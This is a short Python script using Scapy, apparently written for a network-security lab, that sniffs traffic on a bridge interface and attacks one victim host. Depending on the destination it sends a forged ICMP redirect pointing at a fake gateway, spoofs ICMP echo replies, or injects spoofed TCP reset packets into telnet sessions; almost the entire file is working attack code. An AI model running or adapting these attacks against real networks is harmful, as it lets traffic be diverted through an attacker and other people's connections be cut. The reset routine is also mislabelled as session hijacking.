#!/bin/env python3
from scapy.all import *

print("SNIFFING PACKETS.........")

#sinffering
def print_pkt(pkt):
   print("Source IP:", pkt[IP].src)
   print("Destination IP:", pkt[IP].dst)
   print("Protocol:", pkt[IP].proto)
   if pkt[IP].src=='10.9.0.5':
           if pkt[IP].dst=='192.168.60.5':
                print("Victim is connecting Host, start redirect attack:")
                redirect_attack(pkt[IP].src,pkt[IP].dst)
           elif pkt[IP].dst=='10.9.0.6':
                print("Victim is connecting User1")
                reset_auto(pkt)
           elif pkt[IP].dst=='192.168.60.60':
                spoof_pkt(pkt)
   #if (pkt[IP].src=='10.9.0.5' ):
   	#spoof_pkt(pkt)
   print("\n")


#redirect attack
def redirect_attack(ip_src,ip_dst):
    victim = ip_src
    real_gateway = '10.9.0.11'
    fake_gateway = '10.9.0.111'
  
    ip = IP(src = real_gateway,  dst = victim)  
    icmp = ICMP(type=5, code=1)  
    icmp.gw = fake_gateway

    ip2 = IP(src = victim, dst = ip_dst)
    send(ip/icmp/ip2/ICMP());


#spoofing attack    
def spoof_pkt(pkt):
  if ICMP in pkt and pkt[ICMP].type == 8:
     print("Original Packet.........")
     print("Source IP : ", pkt[IP].src)
     print("Destination IP :", pkt[IP].dst)

     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
     icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
     data = pkt[Raw].load
     newpkt = ip/icmp/data

     print("Spoofed Packet.........")
     print("Source IP : ", newpkt[IP].src)
     print("Destination IP :", newpkt[IP].dst)

     send(newpkt,verbose=0)





def reset_auto(pkt):
    myFilter = 'tcp and src host {} and dst host {} and src port 23'.format(pkt[IP].dst, pkt[IP].src)
    print("Running Session Hijacking attack ...")
    print("Filter used: {}".format(myFilter))
    print("Spoofing TCP packets from Client ({}) to Server ({})".format(pkt[IP].src, pkt[IP].dst))
    old_tcp = pkt[TCP]
    old_ip  = pkt[IP]

    ip  = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)
    pkt = ip/tcp
    ls(pkt)
    send(pkt,verbose=0)

pkt = sniff(iface='br-cee580a7c423', filter='ip',prn=print_pkt)
